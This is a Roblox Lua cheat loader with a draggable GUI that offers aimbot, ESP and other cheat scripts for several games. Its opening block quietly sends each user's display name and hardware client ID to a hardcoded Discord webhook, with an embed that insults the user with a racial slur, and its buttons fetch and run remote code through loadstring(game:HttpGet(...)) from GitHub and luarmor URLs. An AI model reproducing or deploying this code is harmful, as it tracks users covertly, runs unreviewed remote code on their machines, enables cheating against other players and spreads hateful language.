local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1291482032861483100/fmP7CoXTs6-gjrGhJGQaLXyLCD1FURQ3DlPQPp6EwBQpRrFXIIJMZe5wij3ivEWcDJfk" --Wehbook

local function sendRequest(requestFunction)
    local jsonBody = HttpService:JSONEncode({
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "**lil nika wake op a guy executed the script!**",
            ["description"] = game.Players.LocalPlayer.DisplayName.." Lil monkey ass executed the script little nigger",
            ["type"] = "rich",
            ["color"] = tonumber(0xffffff),
            ["fields"] = {{
                ["name"] = "Hardware ID:",
                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                ["inline"] = true
            }}
        }}
    })

    local response = requestFunction({
        Url = Webhook_URL,
        Method = "POST",
        Headers = {
            ['Content-Type'] = "application/json"
        },
        Body = jsonBody
    })

    print("Response Status Code: ", response.StatusCode)
    print("Response Body: ", response.Body)
end

local requestFunction = (syn and syn.request) or (http_request) or (request)
if requestFunction then
    sendRequest(requestFunction)
else
    warn("Nenhuma funĂ§ĂŁo de solicitaĂ§ĂŁo HTTP disponĂ­vel.")
end








local UserInputService = game:GetService("UserInputService")

local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local TitleLabel = Instance.new("TextLabel")
local CloseButton = Instance.new("TextButton")
local MinimizeButton = Instance.new("TextButton")
local UIListLayout = Instance.new("UIListLayout")
local ScrollingFrame = Instance.new("ScrollingFrame")
local FooterLabel = Instance.new("TextLabel") -- Voor de "Made by lampenkop" tekst

-- Setup ScreenGui
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Setup MainFrame met ronde hoeken
MainFrame.Size = UDim2.new(0, 450, 0, 550)
MainFrame.Position = UDim2.new(0.5, -225, 0.5, -275)
MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
MainFrame.BorderSizePixel = 0
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.Parent = ScreenGui

-- Ronde hoeken voor MainFrame
local cornerMain = Instance.new("UICorner")
cornerMain.CornerRadius = UDim.new(0, 12)
cornerMain.Parent = MainFrame

-- Setup TitleLabel
TitleLabel.Size = UDim2.new(1, 0, 0, 50)
TitleLabel.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
TitleLabel.Text = "Script Loader"  -- Veranderd naar Script Loader
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextSize = 26
TitleLabel.Parent = MainFrame

-- Ronde hoeken voor TitleLabel
local cornerTitle = Instance.new("UICorner")
cornerTitle.CornerRadius = UDim.new(0, 12)
cornerTitle.Parent = TitleLabel

-- Drag functie om het venster te slepen
local dragging
local dragInput
local dragStart
local startPos

local function update(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

TitleLabel.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TitleLabel.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

-- Setup Close Button
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Position = UDim2.new(1, -35, 0, 10)
CloseButton.Text = "X"
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 75, 75)
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.BorderSizePixel = 0
CloseButton.Font = Enum.Font.Gotham
CloseButton.Parent = MainFrame
CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- Ronde hoeken voor CloseButton
local cornerClose = Instance.new("UICorner")
cornerClose.CornerRadius = UDim.new(0, 6)
cornerClose.Parent = CloseButton

-- Setup Minimize Button
MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
MinimizeButton.Position = UDim2.new(1, -70, 0, 10)
MinimizeButton.Text = "-"
MinimizeButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
MinimizeButton.TextColor3 = Color3.fromRGB(0, 0, 0)
MinimizeButton.BorderSizePixel = 0
MinimizeButton.Font = Enum.Font.Gotham
MinimizeButton.Parent = MainFrame
MinimizeButton.MouseButton1Click:Connect(function()
    if MainFrame.Size.Y.Offset == 550 then
        MainFrame.Size = UDim2.new(0, 450, 0, 50)
    else
        MainFrame.Size = UDim2.new(0, 450, 0, 550)
    end
end)

-- Ronde hoeken voor MinimizeButton
local cornerMinimize = Instance.new("UICorner")
cornerMinimize.CornerRadius = UDim.new(0, 6)
cornerMinimize.Parent = MinimizeButton

-- Setup ScrollingFrame
ScrollingFrame.Size = UDim2.new(1, 0, 1, -80)
ScrollingFrame.Position = UDim2.new(0, 0, 0, 50)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 5, 0)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.Parent = MainFrame

-- Setup UIListLayout voor ScrollingFrame
UIListLayout.Parent = ScrollingFrame

-- Footer Label (Made by lampenkop)
FooterLabel.Size = UDim2.new(1, 0, 0, 20)
FooterLabel.Position = UDim2.new(0, 0, 1, -20)
FooterLabel.BackgroundTransparency = 1
FooterLabel.Text = "Made by lampenkop"
FooterLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
FooterLabel.TextScaled = true
FooterLabel.Font = Enum.Font.Gotham
FooterLabel.Parent = MainFrame

-- Voeg RightShift toggle functionaliteit toe
local guiVisible = true

UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.RightShift then
        guiVisible = not guiVisible
        ScreenGui.Enabled = guiVisible
    end
end)

-- Add game buttons zonder hover effect
local games = {"Aftermath", "Frontlines", "Arsenal", "Counter Blox"}
local loadButtons = {}
local aftermathVisible = false

local function hideLoadButtons()
    for _, btn in ipairs(loadButtons) do
        btn:Destroy()
    end
    loadButtons = {}
end

for _, gameName in ipairs(games) do
    local gameButton = Instance.new("TextButton")
    gameButton.Size = UDim2.new(1, 0, 0, 50)
    gameButton.Text = gameName
    gameButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    gameButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    gameButton.Font = Enum.Font.Gotham
    gameButton.TextSize = 20
    gameButton.BorderSizePixel = 0
    gameButton.Parent = ScrollingFrame

    gameButton.MouseButton1Click:Connect(function()
        hideLoadButtons()

        if gameName == "Aftermath" then
            local buttonNames = {
                {"Load No Fog", "https://raw.githubusercontent.com/lampenkop/lampenkop/refs/heads/gui/nofog.lua"},
                {"Load Car Fly", "https://raw.githubusercontent.com/lampenkop/lampenkop/refs/heads/gui/carfly.lua"},
                {"Load GoodItemESP", "https://raw.githubusercontent.com/lampenkop/lampenkop/refs/heads/gui/gooditemESP.lua"},
                {"Load Inv Viewer", "https://raw.githubusercontent.com/lampenkop/lampenkop/refs/heads/gui/invviewer.lua"},
                {"Load Aimbot/ESP", "https://raw.githubusercontent.com/lampenkop/lampenkop/refs/heads/gui/aimbotandESP.lua"}
            }

            for _, btnInfo in ipairs(buttonNames) do
                local actionButton = Instance.new("TextButton")
                actionButton.Size = UDim2.new(1, 0, 0, 40)
                actionButton.Text = btnInfo[1]
                actionButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
                actionButton.TextColor3 = Color3.fromRGB(255, 255, 255)
                actionButton.Font = Enum.Font.Gotham
                actionButton.TextSize = 18
                actionButton.BorderSizePixel = 0
                actionButton.Parent = ScrollingFrame

                actionButton.MouseButton1Click:Connect(function()
                    loadstring(game:HttpGet(btnInfo[2]))()  -- Laad het juiste script
                end)

                table.insert(loadButtons, actionButton)
            end

        elseif gameName == "Frontlines" then
            local loadButton = Instance.new("TextButton")
            loadButton.Size = UDim2.new(1, 0, 0, 40)
            loadButton.Text = "Load Frontlines Lite"
            loadButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
            loadButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            loadButton.Font = Enum.Font.Gotham
            loadButton.TextSize = 18
            loadButton.BorderSizePixel = 0
            loadButton.Parent = ScrollingFrame

            loadButton.MouseButton1Click:Connect(function()
                loadstring(game:HttpGet('https://api.luarmor.net/files/v3/loaders/0283bdc0d60ac53f19274f3f2b2d5d7c.lua'))()
            end)

            table.insert(loadButtons, loadButton)

        elseif gameName == "Arsenal" then
            local loadButton = Instance.new("TextButton")
            loadButton.Size = UDim2.new(1, 0, 0, 40)
            loadButton.Text = "Load Arsenal Lite"
            loadButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
            loadButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            loadButton.Font = Enum.Font.Gotham
            loadButton.TextSize = 18
            loadButton.BorderSizePixel = 0
            loadButton.Parent = ScrollingFrame

            loadButton.MouseButton1Click:Connect(function()
                loadstring(game:HttpGet('https://api.luarmor.net/files/v3/loaders/950928c94026b8672175ab211f7ae6fb.lua'))()
            end)

            table.insert(loadButtons, loadButton)

        elseif gameName == "Counter Blox" then
            local loadButton = Instance.new("TextButton")
            loadButton.Size = UDim2.new(1, 0, 0, 40)
            loadButton.Text = "Load Counter Blox Lite"
            loadButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
            loadButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            loadButton.Font = Enum.Font.Gotham
            loadButton.TextSize = 18
            loadButton.BorderSizePixel = 0
            loadButton.Parent = ScrollingFrame

            loadButton.MouseButton1Click:Connect(function()
                loadstring(game:HttpGet('https://api.luarmor.net/files/v3/loaders/79eb803153c79937360cda155db35b2f.lua'))()
            end)

            table.insert(loadButtons, loadButton)
        end
    end)
end
